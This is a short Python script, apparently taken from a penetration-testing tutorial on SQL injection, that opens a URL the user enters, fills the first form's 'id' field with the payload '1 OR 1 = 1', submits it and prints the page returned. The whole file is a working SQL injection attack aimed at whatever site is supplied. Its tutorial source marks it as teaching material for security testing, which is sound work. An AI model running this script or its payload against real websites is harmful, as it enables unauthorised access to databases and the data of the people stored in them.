# https://www.tutorialspoint.com/python_penetration_testing/python_penetration_testing_sqli_web_attack.htm
# Date: N/A

import mechanize

url = input("Enter the full url")
request = mechanize.Browser()
request.open(url)

request.select_form(nr = 0)

request["id"] = "1 OR 1 = 1"

response = request.submit()
content = response.read()
print(content)
